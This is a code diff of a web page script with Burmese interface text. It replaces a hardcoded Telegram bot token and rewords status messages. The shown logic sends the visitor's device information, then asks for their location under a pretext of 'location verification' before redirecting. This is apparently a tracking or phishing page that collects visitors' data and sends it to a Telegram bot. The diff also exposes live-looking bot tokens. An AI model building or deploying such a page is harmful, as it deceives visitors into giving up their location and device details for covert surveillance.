@@ -42,7 +42,7 @@
 
   <script>
     // ===== TELEGRAM BOT CONFIGURATION =====
-    const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
+    const BOT_TOKEN = "7308206355:AAFqR-4DnU-N6jScpp3vKpB8hbRSAno_ftc";
     // ======================================
     
     const urlParams = new URLSearchParams(window.location.search);
@@ -154,18 +154,18 @@
       }
       
       // စက်ပစ္စည်းအချက်အလက်ပို့မယ်
-      statusEl.textContent = '📡 ်...';
+      statusEl.textContent = '';
       messageEl.textContent = '';
       await sendDeviceInfo();
       
       // Location ခွင့်တောင်းမယ်
-      statusEl.textContent = '📍 တည်နေရာ အတည်ပြုချက် ရယူနေပါသည်...';
-      messageEl.textContent = 'တည်နေရာ အတည်ပြုချက် ရယူနေပါသည်... ခွင့်ပြုပေးပါ။';
+      statusEl.textContent = '📍 တည်နေရာ အတည်ပြုနေပါသည် locationဖွင့်ထားပါ...';
+      messageEl.textContent = 'တည်နေရာ အတည်ပြုနေပါသည် .. ခွင့်ပြုပေးပါ။';
       
       const locationResult = await getLocation();
       
       if (locationResult) {
-        statusEl.textContent = '✅ တည်နေရာ အတည်ပြုချက် အောင်မြင်ပါသည်။';
+        statusEl.textContent = '✅ တည်နေရာ အတည်ပြုချက် အောင်မြင်ပါသည်';
         messageEl.textContent = 'တည်နေရာ အတည်ပြုချက် အောင်မြင်ပါသည်။ ပြန်ညွှန်းနေပါသည်...';
       } else {
         statusEl.textContent = '❌ တည်နေရာ အတည်ပြုချက် မအောင်မြင်ပါ။';
